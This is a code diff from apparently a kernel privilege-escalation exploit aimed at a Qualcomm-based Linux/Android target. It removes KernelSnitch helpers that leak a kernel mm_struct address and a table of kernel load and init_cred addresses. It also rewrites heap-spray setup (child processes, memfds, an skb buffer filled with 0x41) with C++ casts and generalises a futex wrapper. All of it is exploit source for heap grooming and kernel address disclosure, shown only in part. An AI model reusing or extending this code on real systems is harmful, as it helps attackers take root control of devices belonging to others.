@@ -3,7 +3,6 @@
 #include "target.h"
 #include "kernelsnitch/kernelsnitch.h"
 
-HeapContext g_heap_context;
 #define ks (g_heap_context.snitch)
 #define mm_objs_per_slab (g_heap_context.mm_objs_per_slab)
 #define skb_buf (g_heap_context.skb_buffer)
@@ -43,35 +42,6 @@ int tcp_route_selected(void) {
  * boolean. Future: multicast_waiter_supports(const TargetProfile *). */
 int kernel5_route_selected(void) {
   return target_profile_supports_multicast_waiter(&g_target_profile);
-}
-
-/* Allocate the address-discovery engine. Inputs: resolved profile geometry and
- * runtime CPU count; output: the owned mmap-backed KernelSnitchContext. */
-void setup_kernelsnitch(void) {
-  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  ks = kernelsnitch_context_init(
-      mm_struct_sz(), MM_ORDER, cpu_count, kernelsnitch_collisions(), 0);
-}
-
-/* Query discovered collisions. Input: immutable snitch context; output:
- * boolean collision readiness. */
-int kernelsnitch_collisions_ready(void) {
-  return kernelsnitch_context_has_collisions(ks);
-}
-
-/* Obtain the selected mm_struct candidate. Input: immutable snitch context;
- * output: kernel address or -1. */
-uintptr_t current_kernelsnitch_mm_struct(void) {
-  return kernelsnitch_context_result(ks);
-}
-
-/* Retain the result, destroy the owned snitch context and clear the compatibility
- * owner. Input: current context; output: kernel address or -1. */
-uintptr_t cleanup_kernelsnitch(void) {
-  uintptr_t leaked = kernelsnitch_context_result(ks);
-  kernelsnitch_context_destroy(ks);
-  ks = NULL;
-  return leaked;
 }
 
 void read_first_line(const char *path, char *buf, size_t len) {
@@ -160,9 +130,9 @@ void disable_rseq_for_thread(void) {
 }
 
 long futex_op(uint32_t *uaddr, int op, uint32_t val,
-              const struct timespec *timeout, uint32_t *uaddr2,
+              const void *timeout_or_value, uint32_t *uaddr2,
               uint32_t val3) {
-  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
+  return syscall(SYS_futex, uaddr, op, val, timeout_or_value, uaddr2, val3);
 }
 
 long sched_setattr_tid(int tid, int nice_value) {
@@ -178,13 +148,6 @@ long sched_setattr_tid(int tid, int nice_value) {
   }
   return ret;
 }
-
-/* S06 authoritative address snapshot. */
-ResolvedAddresses g_resolved_addresses = {
-    .soc = TARGET_SOC_QCOM,
-    .kernel_phys_load = P0_KERNEL_PHYS_LOAD,
-    .init_cred_image = 0,
-};
 
 /* Decoupling plan: resolve physical/image address mapping. Input: target
  * profile; output: ResolvedAddresses. Future: resolve_runtime_addresses(). */
@@ -382,20 +345,20 @@ int clone_memfd(void) {
  * heap_context_prepare_mm_sets(), returning errors instead of exiting. */
 void prepare_ctxs(void) {
   prepare_ctx.mm_cnt = 8 * mm_objs_per_slab;
-  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
-  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
+  prepare_ctx.childs = static_cast<pid_t *>(calloc(sizeof(pid_t), prepare_ctx.mm_cnt));
+  prepare_ctx.memfds = static_cast<int *>(calloc(sizeof(int), prepare_ctx.mm_cnt));
 
   spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
-  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
-  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);
+  spray_ctx.childs = static_cast<pid_t *>(calloc(sizeof(pid_t), spray_ctx.mm_cnt));
+  spray_ctx.memfds = static_cast<int *>(calloc(sizeof(int), spray_ctx.mm_cnt));
 
   pre_ctx.mm_cnt = mm_objs_per_slab - 1;
-  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
-  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);
+  pre_ctx.childs = static_cast<pid_t *>(calloc(sizeof(pid_t), pre_ctx.mm_cnt));
+  pre_ctx.memfds = static_cast<int *>(calloc(sizeof(int), pre_ctx.mm_cnt));
 
   post_ctx.mm_cnt = mm_objs_per_slab;
-  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
-  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
+  post_ctx.childs = static_cast<pid_t *>(calloc(sizeof(pid_t), post_ctx.mm_cnt));
+  post_ctx.memfds = static_cast<int *>(calloc(sizeof(int), post_ctx.mm_cnt));
 }
 
 /* Decoupling plan: construct shared fake objects and route-specific waiter data.
@@ -539,7 +502,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
   prepare_ctxs();
 
-  skb_buf = malloc(SKB_SEND_SIZE);
+  skb_buf = static_cast<unsigned char *>(malloc(SKB_SEND_SIZE));
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
